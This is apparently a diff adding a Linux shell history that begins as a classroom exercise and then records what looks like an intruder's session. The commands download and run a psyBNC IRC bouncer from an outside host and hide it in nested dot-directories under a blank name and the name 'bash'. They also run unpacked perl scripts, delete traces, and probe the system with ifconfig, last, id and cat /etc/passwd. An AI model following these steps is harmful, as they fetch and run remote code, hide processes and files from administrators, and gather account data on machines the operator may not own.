@@ -1,0 +1,130 @@
+mkdir aula1
+cd aula1
+aula1$ touch teste
+touch teste
+ls
+ls -l
+ls -la
+exit
+wget
+uptime
+uname -a
+passwd
+ps
+ps x
+who
+w
+wget
+ls -a
+cd aula1
+ls -a
+cd teste
+ls -a
+cd teste
+cd ..
+ls -a
+mkdir .dev
+cd .dev
+mkdir .null
+cd .null
+wget http://funnyboy.clan.su/psybnc-linux.tar
+wget http://uk.download.nvidia.com/Windows/280.26/280.26-desktop-win7-winvista-64bit-international-whql.exe
+ls -a
+rm -fr 280.26-desktop-win7-winvista-64bit-international-whql.exe
+tar zxvf psybnc-linux.tar
+cd psybnc
+./psybnc
+ls -a
+cd ..
+ls -a
+rm -fr psybnc
+rm -fr psybnc-linux.tar
+ls -a
+tar zxvf psyBNC-2.3.2-7.tar.tar
+rm -fr psyBNC-2.3.2-7.tar.tar
+mv psybnc " "
+cd " "
+make
+./make
+chmod +x *
+mv psybnc bash
+make
+./make
+ls -a
+./Makefile
+ls -a
+cd ..
+ls -a
+rm -fr psyBNC2.3.2-4.tar.gz
+rm -fr " "
+tar zxvf d2.tgz
+rm -fr d2.tgz
+cd .wapi
+./autorun
+./run
+cd r
+uname -a
+./clear
+perl clear
+perl .a.txt
+ls -a
+rm -fr a.txt
+rm -fr .a.txt
+ls -a
+/sbin/ifconfig |grep inet
+ps x
+uname -a
+who
+/sbin/ifconfig |grep inet
+ls -a
+cd .dev
+cd .null
+cd .wapi
+cd r
+perl .a.txt
+w
+ps
+uname -a
+id
+who
+last
+host
+whoami
+pwd
+cd ..
+ls
+cd ~
+ls
+ls -la
+cat aula1
+ls aula1
+ls -la aula1
+cat aula1/teste 
+cat .bash_history 
+cd .dev
+ls -la
+cd .null
+ls -la
+cd .wapi/
+ls -la
+cd r
+ls
+ls -la
+cd ..
+ls -la
+ps
+cd ..
+rm -rf .dev
+ls -la
+cat /etc/issue
+ifconfig
+ls -la /tmp
+w
+top
+su
+sudo
+cd /etc
+ls
+cat /etc/passwd
+su diogo
+exit
